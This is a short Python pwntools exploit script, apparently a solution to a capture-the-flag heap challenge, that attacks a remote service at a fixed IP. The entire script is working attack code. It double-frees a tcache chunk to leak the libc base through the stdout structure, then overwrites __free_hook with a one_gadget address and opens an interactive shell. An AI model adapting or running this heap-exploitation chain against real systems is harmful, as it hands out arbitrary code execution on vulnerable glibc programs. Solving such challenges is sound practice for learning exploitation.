from pwn import *

context.log_level='debug'

def add(size, cont):
  p.sendlineafter(":\n", str(1))
  p.sendlineafter("enter the size\n", str(size))
  p.sendafter("Enter data\n", cont)

def view():
  p.sendlineafter(":\n", str(2))

def delete():
  p.sendlineafter(":\n", str(3))

p=remote("34.121.211.139", 4444)
#p=process("./chall")
e=ELF("./chall")
l=ELF("./libc-2.27.so")

add(0x10,"A"*8)
delete()
delete()
add(0x10, p64(0x601020-0x10))
add(0x10, "A")
add(0x10, "A"*0x10)
view()

libc_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-l.sym['_IO_2_1_stdout_']
free_hook=libc_base+l.sym['__free_hook']
oneshot=libc_base+0x4f3c2
print hex(libc_base)

add(0x20, "A"*0x10)
delete()
delete()
add(0x20, p64(free_hook))
add(0x20, "A")
add(0x20, p64(oneshot))

pause()

add(0x30, "lastone!")
delete()

p.interactive()